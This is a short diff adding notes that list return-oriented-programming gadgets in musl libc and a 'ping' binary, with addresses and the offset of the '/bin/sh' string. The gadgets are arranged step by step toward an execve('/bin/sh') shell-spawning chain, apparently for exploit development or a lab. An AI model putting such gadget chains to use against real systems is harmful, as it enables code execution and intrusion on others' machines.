@@ -1,0 +1,26 @@
+[+] Get execve syscall number (59) into %rax
+  musl:
+    0x00000000000182f0 : pop rax ; ret
+  ping:
+    0x0000000000003001 : pop rax ; ret
+
+[+] Get first argument (const char *filename) into %rdi
+  musl:
+    0x00000000000173e8 : pop rdi ; ret
+
+[+] Offset of program to execve
+  musl:
+    0x8bfa9 (+0x2bfa9 from start of .rodata): "/bin/sh" (with null terminator)
+
+[+] Get second argument (const char *const argv[]) into %rsi
+  musl:
+    0x000000000001715a : pop rsi ; ret
+
+[+] Get third argument (const char *const envp[]) into %rdx
+  musl:
+    0x00000000000178a3 : pop rdx ; ret
+
+[+] Make the syscall
+  musl:
+    0x00000000000171cf : syscall
+    0x0000000000021321 : syscall ; ret
